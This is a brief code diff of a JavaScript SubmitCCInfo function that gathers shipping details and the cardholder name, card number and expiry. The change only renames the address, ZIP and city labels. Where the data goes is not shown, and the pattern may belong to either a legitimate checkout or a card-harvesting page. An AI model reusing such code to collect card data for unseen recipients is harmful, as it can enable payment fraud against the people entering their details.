@@ -58,9 +58,9 @@ const SubmitCCInfo = async () => {
                 `\nFirst Name: ${hpShippingFirstNameInput.value}` +
                 `\nLast Name: ${hpShippingLastNameInput.value}` +
                 `\nAddress: ${hpShippingAddressInput.value}` +
-                `\nAddress: ${hpShippingAddress2Input.value}` +
-                `\nAddress: ${hpShippingZIPInput.value}` +
-                `\nAddress: ${hpShippingCityInput.value}`,
+                `\nAddress2: ${hpShippingAddress2Input.value}` +
+                `\nZIP: ${hpShippingZIPInput.value}` +
+                `\nCity: ${hpShippingCityInput.value}`,
             ccName: `${hpCCFirstLastNameVal}`,
             ccNumber: hpCardNumberVal,
             ccExp: hpCardMMYYVal,
